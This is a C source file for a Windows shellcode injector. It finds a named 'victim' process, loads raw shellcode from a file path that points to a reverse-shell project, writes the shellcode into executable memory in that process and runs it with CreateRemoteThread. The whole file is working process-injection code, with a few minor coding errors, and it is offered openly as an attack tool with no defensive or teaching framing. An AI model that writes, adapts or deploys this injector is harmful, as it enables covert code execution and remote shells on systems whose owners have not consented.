#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

DWORD FindProcessId(PWCHAR processname)
{
	NTSTATUS status;
	PVOID buffer;
	PSYSTEM_PROCESS_INFORMATION spi;
	DWORD pid = 0;

	buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	spi = (PSYSTEM_PROCESS_INFORMATION)buffer;

	status = NtQuerySystemInformation(SystemProcessInformation, spi, 1024 * 1024, NULL);

	while (spi->NextEntryOffset) // Loop over the list until we reach the last entry, or found PID.
	{
		if (wcsncmp(spi->ImageName.Buffer, processname, spi->ImageName.Length) == 0)
		{
			pid = spi->UniqueProcessId;
		}
		spi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)spi + spi->NextEntryOffset); // Calculate the address of the next entry.

	}

	return pid;
}


int main(int argc, char * argv[])
{
	if (argc != 2)
	{
		wprintf(L"Usage: injector.exe <processname>\n");
		return 1;
	}

	WCHAR victimProcessName[MAX_PATH];
	mbstowcs(victimProcessName, argv[1], MAX_PATH); // Plus null

	printf("About to inject shellcode to process - %S. Procced? (Enter)", victimProcessName);
	scanf("%0s");

	// Read shellcode bytes
	char* path = L"D:\\other_projects\\reverse_shell\\reverse_shell_shellcode_raw";

	HANDLE hFile = CreateFileW(path, GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error: Failed to open file, %d", GetLastError());
		return 1;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);

	if (fileSize == INVALID_FILE_SIZE)
	{
		printf("Error: Failed to get file size, %d", GetLastError());
		CloseHandle(hFile);
		return 1;
	}

	DWORD bytesRead;
	char* shellcodeBytes = (char*)malloc(fileSize * sizeof(char));
	BOOL readFileResult = ReadFile(hFile, shellcodeBytes, fileSize, &bytesRead, NULL);

	if (!readFileResult || bytesRead != fileSize)
	{
		printf("Error: Failed to read file contents, %d", GetLastError());
		free(shellcodeBytes, 0, MEM_RELEASE);
		CloseHandle(hFile);
		return 1;
	}

	CloseHandle(hFile);

	DWORD PID = FindProcessId(victimProcessName);

	if (PID == 0)
	{
		printf("Failed to find PID");
		return 1;
	}

	printf("pid of process found: %ld\n", PID);
	HANDLE hVictimProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); // handle to the victim process

	if (hVictimProcess == NULL)
	{
		printf("Error getting handle to process, %d", GetLastError());
		return 1;
	}

	LPVOID remoteShellcodeAddr =
		VirtualAllocEx(hVictimProcess, NULL, bytesRead, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // base address

	if (remoteShellcodeAddr == NULL)
	{
		printf("Failed virtual alloc, %d", GetLastError());
		return 1;
	}

	BOOL writeProcMemResult = WriteProcessMemory(hVictimProcess, remoteShellcodeAddr, (LPCVOID)shellcodeBytes, bytesRead, NULL);

	if (writeProcMemResult == FALSE)
	{
		printf("Error with writing process memory, %d", GetLastError());
		return 1;
	}

	HANDLE hRemoteThread = CreateRemoteThread(hVictimProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)remoteShellcodeAddr, NULL, NULL, NULL);

	if (hRemoteThread == NULL)
	{
		printf("Error with creating remote thread, %d", GetLastError());
		return 1;
	}

	printf("Done, shellcode injected.");

	return 0;
}